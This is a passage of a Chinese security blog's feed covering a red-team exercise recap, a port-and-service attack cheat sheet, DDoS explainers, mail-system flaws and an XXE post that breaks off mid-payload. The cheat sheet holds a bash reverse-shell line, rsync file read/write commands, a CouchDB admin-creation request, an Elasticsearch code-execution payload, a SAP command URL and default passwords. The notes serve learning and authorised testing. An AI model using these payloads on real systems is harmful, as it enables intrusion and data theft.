    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这次参加的是广州市的护网红队，跟着师兄一起去的，我一个大一的玩意就不指望能拿shell啥的了。<br>虽然结果排名不高，但是队员们很努力。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>准备</strong><br>首先的话会有提供靶标和虚拟机给你使用，这些机子在上交报告和复现都要用到，其他时候也要挂着VPN。</p><p><strong>信息收集</strong></p><ul><li>先用enscan收集一下企业资产</li><li>使用搜索引擎搜索官网</li><li>在官网上看看各个功能</li><li>使用Wappalyzer查看网站的框架</li><li>用findsomething插件、Find-SomeThing脚本、jjjjjjjjjjjjjs脚本看网页JS信息泄露</li><li>识别git/svn泄露（实在太少而且难以利用）</li><li>使用EHole指纹识别</li><li>dirsearch或者御剑扫描目录，线程不要太高，时间够的不用急</li><li>nmap或者masscan扫端口</li><li><a href="https://rapiddns.io/subdomain">网站1</a>、<a href="https://www.dnsgrep.cn/subdomain/">网站2</a>收集子域名</li><li><a href="https://ping.chinaz.com/">多地点Ping</a>查看真实ip</li><li>zoomeye和shodan根据ip查找（感觉这样子更加准确）</li><li>肉眼分析框架（网上的工具不太会用，手工分析更加方便）</li></ul><p><strong>利用工具检测漏洞</strong></p><ol><li>apt_tools</li><li>LiqunKit</li><li>nuclei</li><li>shiro_attack</li><li>SpringBoot-Scan</li><li>Wpscan</li><li>ThinkphpGUI</li><li>Xray</li><li>神机综合利用工具</li><li>unauthorizedV2未授权检测</li><li>wafw00f识别</li></ol><p><strong>手动检测漏洞</strong></p><ol><li>弱口令爆破</li><li>网页跳转间隔进行未授权访问</li><li>重新审计JS文件寻找未授权</li><li>注册用户文件上传</li><li>更改密码逻辑漏洞</li><li>路径穿越，任意文件读取</li><li>sql注入（渗透中是中危，但是护网中不拿shell、密码或者重要数据的话分数较少）</li><li>伪造token/cookie</li></ol><p><strong>最后</strong><br>收集数据，填写报告上交审核，不过就扯嘴皮。</p><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>因为我们队实力不算很好，还有我这个摸鱼的，所以也没学到特别多的东西，希望以后能跟着大佬一起学习吧。<br>护网的时候拿分应该是有诀窍的，但是俺不知道。<br>信息泄露那成百上千万条估计是个大头，以后红队多注重这方面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;这次参加的是广州市的护网红队，跟着师兄一起去的，我一个大一的玩意就不指望能拿shell啥的了。&lt;br&gt;虽然结果排名不高，但是队员们很努力。&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>常见的端口和对应的服务</title>
    <link href="https://liu1272.github.io/2023/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1/"/>
    <id>https://liu1272.github.io/2023/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1/</id>
    <published>2023-07-12T12:07:00.000Z</published>
    <updated>2023-07-19T07:32:29.797Z</updated>
    
    <content type="html"><![CDATA[<h4 id="web类"><a href="#web类" class="headerlink" title="web类"></a>web类</h4><p><strong>struts2：</strong><br>太多，略……</p><p><strong>thinkphp：</strong><br><a href="https://smms.app/image/AtUjGFfCBWR9mxz" target="_blank"><img src="https://s2.loli.net/2023/07/19/AtUjGFfCBWR9mxz.png" ></a></p><p><strong>jboss：</strong><br><a href="https://smms.app/image/1sElFjNxyCQTUdw" target="_blank"><img src="https://s2.loli.net/2023/07/19/1sElFjNxyCQTUdw.png" ></a></p><p><strong>ganglia：</strong><br>CVE-2007-6465: 多个跨站脚本攻击漏洞<br>CVE-2012-3448: 未明PHP代码执行漏洞<br>8649端口未授权访问: 通过http协议获取相关监控的xml信息<br>nmap扫描脚本  <code>nmap --script ganglia-info --script-args ganglia-info.timeout=60,ganglia-info.bytes=100000 -p</code></p><p><strong>zabbix：</strong><br>弱口令/默认账号: </p><pre><code>admin:zabbixAdmin:zabbixguest: 空</code></pre><p>ave-2016-10134: sql注入<br>系统命令执行: 管理员登录后Administrator-script-createscript</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1</code></pre><h4 id="数据库类（扫描弱口令）"><a href="#数据库类（扫描弱口令）" class="headerlink" title="数据库类（扫描弱口令）"></a>数据库类（扫描弱口令）</h4><p><strong>MSSQL</strong></p><pre><code>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）攻击方法：    爆破：弱口令/使用系统用户    注入参考：    https://www.anquanke.com/post/id/86011</code></pre><p><strong>Oracle</strong></p><pre><code>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）攻击方法：    爆破：弱口令    注入攻击；    漏洞攻击；    -参考：    https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</code></pre><p><strong>MySQL</strong></p><pre><code>默认端口：3306攻击方法：    爆破：弱口令    身份认证漏洞：CVE-2012-2122    拒绝服务攻击    Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意    提权参考：    https://www.seebug.org/appdir/MySQL    http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390    https://xz.aliyun.com/t/1491</code></pre><p><strong>PostgreSQL</strong></p><pre><code>默认端口：5432攻击方法：    爆破：弱口令：postgres postgres    缓冲区溢出：CVE-2014-2669参考：    http://drops.xmd5.com/static/drops/tips-6449.html    https://www.secpulse.com/archives/69153.html</code></pre><p><strong>MongoDB</strong></p><pre><code>默认端口：27017攻击方法：    爆破：弱口令    未授权访问；github有攻击代码；请点击参考：    http://www.cnblogs.com/LittleHann/p/6252421.html    http://www.tiejiang.org/19157.html</code></pre><p><strong>Redis</strong></p><pre><code>攻击方法：    爆破：弱口令    未授权访问+配合ssh key提权；参考：    http://www.alloyteam.com/2017/07/12910/</code></pre><p><strong>SysBase</strong></p><pre><code>默认端口：服务端口5000；监听端口4100；备份端口：4200攻击方法：    爆破：弱口令    命令注入：</code></pre><p><strong>DB2</strong></p><pre><code>默认端口：5000攻击方法：    安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）参考：    http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</code></pre><h4 id="特殊服务类（未授权-命令执行-漏洞）"><a href="#特殊服务类（未授权-命令执行-漏洞）" class="headerlink" title="特殊服务类（未授权/命令执行/漏洞）"></a>特殊服务类（未授权/命令执行/漏洞）</h4><p><strong>443 SSL心脏滴血</strong><br>该落地是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。<br>攻击原理是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），导致可以读取的数据比应该允许读取的还多。<br>利用该漏洞，攻击者可以远程读取服务器内存中64K的数据，获取内存中的敏感信息。</p><p><strong>873 Rsync未授权</strong><br>rsync是Linux/Unix下的一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件和目录。<br>由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p><pre><code>【列目录】rsync --port=xxx ip::rsync rsync://192.168.241.142:873/【看目录】rsync --port=xxx ip::目录名rsync rsync://192.168.241.142:873/src/【文件下载】rsync --port=xxx ip::目录名 ./rsync -av rsync://192.168.241.142:873/src/etc/passwd ./【文件写入】rsync -av muma.txt rsync://192.168.241.142:873/src/target.txt利用文件上传设置计划任务来反弹shell</code></pre><p><strong>5984 CouchDB未授权</strong></p><p>CVE-2017-12635权限绕过：到/_utils 目录下验证登陆,后续使用反弹shell进行进一步利用</p><pre><code>PUT /_users/org.couchdb.user:vulhub&#123;  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;vulhub&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;roles&quot;: [],  &quot;password&quot;: &quot;vulhub&quot;&#125;</code></pre><p><strong>6379 redis未授权</strong><br><code>./redis-cli -h ip</code>  直接连接就行了</p><p><strong>7001、7002 weblogic默认弱口令、反序列化</strong></p><pre><code>【登录页面】http://ip:7001/console/login/LoginForm.jsp【默认密码】weblogic Oracle@123【反序列化漏洞】http://ip:7001/_async/AsyncResponseService</code></pre><p><strong>9200、9300 ElasticSearch未授权、命令执行漏洞</strong></p><pre><code>【未授权】http://localhost:9200/rvier/search 查看敏感信息了 http://localhost:9200/_plugin/head/ web管理界面 http://localhost:9200/_cat/indices 查看所有的index http://localhost:9200/river/search 查看数据库敏感信息 http://localhost:9200/_nodes 查看节点数据【命令执行】POST /_search?pretty HTTP/1.1&#123;    &quot;size&quot;: 1,    &quot;query&quot;: &#123;      &quot;filtered&quot;: &#123;        &quot;query&quot;: &#123;          &quot;match_all&quot;: &#123;          &#125;        &#125;      &#125;    &#125;,    &quot;script_fields&quot;: &#123;        &quot;command&quot;: &#123;            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;        &#125;    &#125;&#125;    &#125;&#125;</code></pre><p><strong>11211 memcache未授权访问</strong><br><code>telnet ip port</code> 直接连接</p><p><strong>50000 SAP命令执行</strong></p><pre><code>https://XXX/ctc/servlet/ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id</code></pre><p><strong>50070、50030 hadoop默认端口未授权访问</strong></p><pre><code>http://ip:port/cluster后续上传文件反弹shell利用</code></pre><h4 id="常见的端口漏洞"><a href="#常见的端口漏洞" class="headerlink" title="常见的端口漏洞"></a>常见的端口漏洞</h4><table><thead><tr><th>端口</th><th>服务</th><th>描述</th></tr></thead><tbody><tr><td>21</td><td>ftp</td><td>FTP服务端，存在匿名未授权访问和爆破风险</td></tr><tr><td>22</td><td>ssh</td><td>SSH服务端，存在root密码爆破和后门用户的风险</td></tr><tr><td>23</td><td>telnet</td><td>Telnet服务端，常见于路由器、交换机和嵌入式设备，存在弱口令风险</td></tr><tr><td>25</td><td>smtp</td><td>SMTP服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破</td></tr><tr><td>80</td><td>http</td><td>HTTP Web服务，常见的漏洞包括中间件反序列化、FastCGI配置不当等</td></tr><tr><td>110</td><td>pop3</td><td>POP3服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破</td></tr><tr><td>443</td><td>https</td><td>HTTPS服务端，可能受影响的漏洞包括OpenSSL的心脏滴血和SSL/TLS低版本漏洞</td></tr><tr><td>135</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>139</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>445</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>3389</td><td>RDP</td><td>RDP服务，可能受CVE-2019-0708漏洞的影响</td></tr></tbody></table><h4 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h4><table><thead><tr><th>端口</th><th>对应的服务</th><th>存在的相关漏洞</th></tr></thead><tbody><tr><td>21/69</td><td>ftp/tftp：文件传输协议</td><td>爆破,嗅探溢出,后门,匿名访问</td></tr><tr><td>22</td><td>ssh</td><td>爆破,openssh漏洞</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>弱口令,未授权访问,邮件伪造</td></tr><tr><td>53</td><td>dns：域名系统</td><td>dns区域传输,劫持,缓存投毒,隧道技术刺透防火墙</td></tr><tr><td>80/8080</td><td>apache/tomcat/nginx/axis2</td><td>爆破弱口令,http慢速攻击,解析漏洞</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击,控制台爆破,对应服务器版本漏洞</td></tr><tr><td>80/81/443</td><td>IIS</td><td>put写文件,短文件名漏洞,解析漏洞</td></tr><tr><td>110</td><td>pop3</td><td>弱口令</td></tr><tr><td>123</td><td>ntp</td><td>ntp放大攻击</td></tr><tr><td>137/139</td><td>samba</td><td>爆破,未授权访问,远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破注入攻击</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ladp</td><td>注入攻击,未授权访问,爆破</td></tr><tr><td>443</td><td>https</td><td>心脏滴血</td></tr><tr><td>445</td><td>smb</td><td>溢出漏洞</td></tr><tr><td>512</td><td>linux r</td><td>rlogin远程登录</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破:进行内网渗透</td></tr><tr><td>1098</td><td>javarmi</td><td>命令执行</td></tr><tr><td>1352</td><td>lotus</td><td>爆破信息泄露跨站脚本攻击</td></tr><tr><td>1433</td><td>mssql</td><td>爆破,注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>未授权访问</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>2222</td><td>da</td><td>da虚拟主机</td></tr><tr><td>2601</td><td>zebra</td><td>默认密码</td></tr><tr><td>3128</td><td>squid</td><td>空口令</td></tr><tr><td>3306</td><td>mysql</td><td>漏洞：爆破,拒绝服务,注入</td></tr><tr><td>3389</td><td>rdp/windows远程连接</td><td>爆破,shift后门,3389漏洞攻击</td></tr><tr><td>4100</td><td>sysbase</td><td>弱口令</td></tr><tr><td>4440</td><td>rundeck</td><td>弱口令</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破认证绕过</td></tr><tr><td>5000</td><td>sybase/db2</td><td>弱口令命令,注入</td></tr><tr><td>5422</td><td>postgresql</td><td>弱口令</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出,注入攻击,爆破</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务,代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破,认证口令绕过,拒绝服务攻击,权限提升</td></tr><tr><td>5984</td><td>couchdb</td><td>命令执行</td></tr><tr><td>6082</td><td>varnish</td><td>未授权访问</td></tr><tr><td>6379</td><td>redis</td><td>弱口令,未授权访问</td></tr><tr><td>7001</td><td>weblofic</td><td>爆破,弱口令(system/system,weblogic/weblogic),congsole后台部署webshell,java反序列化泄漏源代码/列目录,ssrf窥探内网,命令执行</td></tr><tr><td>8000</td><td>jdwp</td><td>命令执行</td></tr><tr><td>8069</td><td>zabbix</td><td>命令执行</td></tr><tr><td>8080</td><td>apache/tomcat/nginx/axis2/jboss中间件</td><td>弱口令命令执行</td></tr><tr><td>8080</td><td>jboss,其他端口：1098/1099/4444/4445/8080/8009/8083/8093</td><td>爆破,远程代码执行,java反序列化</td></tr><tr><td>8080</td><td>glassfish,其他端口：iiop：3700；控制台：4848</td><td>爆破,任意文件读取,认证绕过</td></tr><tr><td>8080</td><td>resin</td><td>目录遍历,远程代码执行</td></tr><tr><td>8080/8089</td><td>jenkis</td><td>爆破,未授权访问,反序列化</td></tr><tr><td>8080</td><td>jetty</td><td>远程共享,缓冲区溢出</td></tr><tr><td>8161</td><td>activemq</td><td>文件上传</td></tr><tr><td>8649</td><td>ganglia</td><td>未授权访问,信息泄露</td></tr><tr><td>8980</td><td>opennms</td><td>反序列化漏洞</td></tr><tr><td>9080</td><td>websphere</td><td>弱口令,反序列化,文件泄露</td></tr><tr><td>9090</td><td>websphere</td><td>控制台爆破,反序列化java</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行,未授权访问</td></tr><tr><td>11211</td><td>memcache</td><td>未授权访问</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破,未授权</td></tr><tr><td>27018</td><td>mongodb</td><td>未授权</td></tr><tr><td>50000</td><td>sap</td><td>命令执行</td></tr><tr><td>50010</td><td>hadoop</td><td>信息泄露命令执行</td></tr><tr><td>50030</td><td>hadoop</td><td>未授权访问</td></tr><tr><td>50070</td><td>hadoop</td><td>未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持欺骗</td></tr></tbody></table><p><strong>注意：端口可能会被更改或隐藏以达到防御目的</strong><br><strong>这个时候就需要进行端口爆破</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;web类&quot;&gt;&lt;a href=&quot;#web类&quot; class=&quot;headerlink&quot; title=&quot;web类&quot;&gt;&lt;/a&gt;web类&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;struts2：&lt;/strong&gt;&lt;br&gt;太多，略……&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;thinkphp：&lt;/</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>DDOS攻击</title>
    <link href="https://liu1272.github.io/2023/07/11/DDOS%E6%94%BB%E5%87%BB/"/>
    <id>https://liu1272.github.io/2023/07/11/DDOS%E6%94%BB%E5%87%BB/</id>
    <published>2023-07-10T17:47:00.000Z</published>
    <updated>2023-07-17T18:36:58.448Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h3><p>Dos是拒绝服务式攻击。<br>一切能引起DOS行为的攻击都被称为Dos攻击。<br>该攻击的效果是使得计算机或网络无法提供正常的服务。</p><h4 id="SYN洪水攻击（SYN-flood）"><a href="#SYN洪水攻击（SYN-flood）" class="headerlink" title="SYN洪水攻击（SYN flood）"></a>SYN洪水攻击（SYN flood）</h4><p>SYN洪水攻击属于DoS攻击的一种<br>它利用TCP协议缺陷，通过发送大量的半连接请求，耗费目标服务的CPU和内存资源。<br>对于TCP连接而言，当服务器接收到连接请求(SYN=i )时，则将此信息加入未连接队列，并发送请求包给客户端( SYN=j,ACK=i+1 )，此时进入SYN RECV状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时才将此条目从未连接队列删除。<br><strong>攻击的方式:</strong></p><ol><li>利用特殊的程序，设置TCP的Header，向服务器源源不断的发送只有SYN标志的TCP连接请求</li><li>服务器接收并为这些请求建立会话，并把它们全部加入未连接队列中并等待客户的确认</li><li>由于源地址是不存在的，服务器需要不断的重发直至超时<br>这些伪造的SYN包将长时间占用未连接队列，而正常的SYN 请求被丢弃，那么服务器就不能接收其他正常用户的请求了。<br>而且SYN攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN攻击并不管目标是什么系统，<strong>只要这些系统打开TCP服务就可以实施。</strong></li></ol><h4 id="DNS欺骗式攻击"><a href="#DNS欺骗式攻击" class="headerlink" title="DNS欺骗式攻击"></a>DNS欺骗式攻击</h4><p>攻击者先执行利用型攻击（如缓冲区溢出、特洛伊木马等）侵入DNS服务器的高速缓存并将不同的域名映射到被攻击目标的IP。<br>若此时用户发出一个域名解析请求，那么得到的就是被攻击者的IP，被攻击目标会收到大量的网页连接报文，造成DDOS攻击。</p><h4 id="DNS反弹式攻击（放大攻击）"><a href="#DNS反弹式攻击（放大攻击）" class="headerlink" title="DNS反弹式攻击（放大攻击）"></a>DNS反弹式攻击（放大攻击）</h4><p>攻击者发送源IP为被攻击目标IP的查询报文到大量开放的DNS服务器，DNS服务器把相应的应答报文发送到被攻击目标形成DDOS攻击。<br><strong>原理：</strong><br>域名服务器对特定的查询报文返回应答报文可超过512字节，所以一个64字节的DNS查询报文就可产生一个大于4000字节的响应报文<br>由于以太网MTU限制，被分为3个IP包在网络中传输，流量的放大比率近1:73。</p><h4 id="ICMP-Flood（死亡Ping）"><a href="#ICMP-Flood（死亡Ping）" class="headerlink" title="ICMP Flood（死亡Ping）"></a>ICMP Flood（死亡Ping）</h4><p>在短时间内向目的主机发送大量的ping的echo报文，主机不断响应，造成网络堵塞，主机资源耗尽。<br>尽管某些 ping 数据包非常小，但 IPv4 ping 数据包要大得多，并且可以达到 65,535 字节的最大允许数据包大小。<br>某些 TCP/IP 系统从未设计用于处理大于最大值的数据包，从而使其容易受到大于该大小的数据包的攻击。<br>当恶意大数据包从攻击者传输到该目标时，该数据包将分成多个分段，每个分段均低于最大大小限制。<br>当目标计算机尝试将这些部分一起放回时，总数超出大小限制，并且可能发生缓冲区溢出，从而导致目标计算机冻结、崩溃或重启。</p><h4 id="UDP-Flood"><a href="#UDP-Flood" class="headerlink" title="UDP Flood"></a>UDP Flood</h4><p>UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包冲击服务器。<br>正常应用情况下，UDP包双向流量会基本相等，而且大小和内容都是随机的，变化很大。<br>出现UDP Flood的情况下，针对同一目标IP的UDP包在一侧大量出现，并且内容和大小都比较固定。</p><h4 id="IP-Flood"><a href="#IP-Flood" class="headerlink" title="IP Flood"></a>IP Flood</h4><p>这种攻击利用TC0协议栈的RST位来实现<br>假设有有个合法的用法(1.1.1.1)已经与服务器建立了连接，攻击者构造攻击的TCP数据，伪装自己的ip为1.1.1.1，并向服务器发送有一个带有RST位的TCP数据段<br>服务器接收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中已经建立好的连接<br>这时合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就被拒绝服务而只能重新开始建立新的连接。</p><h4 id="Teardrop泪滴攻击"><a href="#Teardrop泪滴攻击" class="headerlink" title="Teardrop泪滴攻击"></a>Teardrop泪滴攻击</h4><p>Teardrop攻击是一种拒绝服务攻击，是一种针对IP协议的攻击方法<br>当“13位分片偏移”字段设置成错误的值(既可与上一分片数据重叠，也可错开)<br>服务端在组合这种含有重叠偏移的伪造分片报文时，end-offset会溢出，产生一个非常大的数<br>这部分溢出数据可能会覆盖系统内存的重要内存，甚至导致系统的崩溃等。</p><h4 id="反射攻击"><a href="#反射攻击" class="headerlink" title="反射攻击"></a>反射攻击</h4><p>将源ip设置为目标ip并向大量服务器发送可返回数据请求</p><h4 id="FIN-RST-Flood攻击"><a href="#FIN-RST-Flood攻击" class="headerlink" title="FIN/RST Flood攻击"></a>FIN/RST Flood攻击</h4><p>TCP交互过程中FIN报文用来正常关闭TCP连接，RST报文用来异常断开TCP连接。<br>当使用伪造ip向服务器发送RST数据包而且ip正好是用户ip时，用户的链接被中断。</p><h4 id="HTTP攻击（CC攻击）"><a href="#HTTP攻击（CC攻击）" class="headerlink" title="HTTP攻击（CC攻击）"></a>HTTP攻击（CC攻击）</h4><p><code>Challenge Collapsar</code>攻击是针对Web服务在第七层协议（应用层）发起的攻击<br>一般的攻击者会选择搜索之类需要做大量数据查询的页面作为攻击目标，可以消耗服务器尽可能多的资源。<br>攻击时尽量选择正常用户也通过APP访问的页面，一般来说就是各种Web API。<br>正常用户和恶意流量都是来源于APP，人机差别很小，基本融为一体难以区分。<br>但是由于HTTP协议实际上是基于tcp协议的，需要三次握手，所以不能伪造ip</p><h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><ol><li>使用工具根据IP地址的路径逻辑检测出矛盾，从而判断是否是正常流量</li><li>CDN、高防、负载均衡、分布式集群防御</li><li>限制特定流量：检查访问来源做适当限制</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;DOS攻击&quot;&gt;&lt;a href=&quot;#DOS攻击&quot; class=&quot;headerlink&quot; title=&quot;DOS攻击&quot;&gt;&lt;/a&gt;DOS攻击&lt;/h3&gt;&lt;p&gt;Dos是拒绝服务式攻击。&lt;br&gt;一切能引起DOS行为的攻击都被称为Dos攻击。&lt;br&gt;该攻击的效果是使得计算机或网络</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>邮件系统漏洞攻击</title>
    <link href="https://liu1272.github.io/2023/07/10/%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/"/>
    <id>https://liu1272.github.io/2023/07/10/%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</id>
    <published>2023-07-09T17:30:00.000Z</published>
    <updated>2023-07-17T17:47:08.670Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>漏洞攻击是危害网络安全中较为常见的一种。<br>不同应用程序彼此之间的相互作用，如大多数程序必须与其它API相交互，保存并检索文件，同时运行在多种不同类型的设备上，都会可能产生漏洞；<br>又如互联网通信协议—TCP和UDP，其开放性常常引来黑客的攻击；而IP地址的脆弱性，也给黑客的伪造提供了可能，从而泄露远程服务器的资源信息。</p><h4 id="危害-漏洞利用"><a href="#危害-漏洞利用" class="headerlink" title="危害/漏洞利用"></a>危害/漏洞利用</h4><p><strong>一、IMAP 和 POP 漏洞：</strong><br>这些协议常见弱点是密码脆弱，同时，各种IMAP和POP服务还容易受到如缓冲区溢出等类型的攻击。</p><p><strong>二、拒绝服务（DoS）攻击：</strong><br>1.死亡Ping——发送一个无效数据片段，该片段始于包结尾之前，但止于包结尾之后；<br>2.同步攻击——极快地发送TCP SYN包（它会启动连接），使受攻击的机器耗尽系统资源，进而中断合法连接；<br>3.循环——发送一个带有完全相同的源／目的地址／端口的伪造SYN包，使系统陷入一个试图完成TCP连接的无限循环中。<br><strong>DDOS攻击的相关内容后面再写</strong></p><p><strong>三、系统配置漏洞：</strong><br>1.默认配置——大多数系统在交付给客户时都设置了易于使用的默认配置，被黑客盗用变得轻松；2.空的／默认根密码——许多机器都配置了空的或默认的根／管理员密码，并且其数量多得惊人；<br>3.漏洞创建——几乎所有程序都可以配置为在不安全模式下运行，这会在系统上留下不必要的漏洞。</p><p><strong>四、利用软件问题：</strong><br>在服务器守护程序、客户端应用程序、操作系统和网络堆栈中，存在很多的软件错误，分为以下几类：<br>1.缓冲区溢出——程序员会留出一定数目的字符空间来容纳登录用户名，黑客则会通过发送比指定字符串长的字符串，其中包括服务器要执行的代码，使之发生数据溢出，造成系统入侵。<br>2.意外组合——程序通常是用很多层代码构造而成的，入侵者可能会经常发送一些对于某一层毫无意义，但经过适当构造后对其他层有意义的输入。<br>3.未处理的输入——大多数程序员都不考虑输入不符合规范的信息时会发生什么。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;漏洞攻击是危害网络安全中较为常见的一种。&lt;br&gt;不同应用程序彼此之间的相互作用，如大多数程序必须与其它API相交互，保存并检索文件，同时运行</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>XXE（XML外部实体注入）</title>
    <link href="https://liu1272.github.io/2023/07/09/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
    <id>https://liu1272.github.io/2023/07/09/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/</id>
    <published>2023-07-09T08:17:00.000Z</published>
    <updated>2023-07-19T07:21:30.841Z</updated>
    
    <content type="html"><![CDATA[<h4 id="了解XML"><a href="#了解XML" class="headerlink" title="了解XML"></a>了解XML</h4><p>XML 是一种标记语言，很类似于 HTML<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息<br>因此我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>XXE是针对解析XML输入的应用程序的一种攻击。<br>当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。</p><h4 id="常见漏洞存在点"><a href="#常见漏洞存在点" class="headerlink" title="常见漏洞存在点"></a>常见漏洞存在点</h4><p>可解析xml的api接口</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>内网端口扫描</li><li>利用file协议等读取文件</li><li>攻击内网web应用使用</li><li>get(struts2等)</li></ol><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol><li>导致可以加载恶意外部文件</li><li>造成文件读取（信息泄露、SSRF）<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM 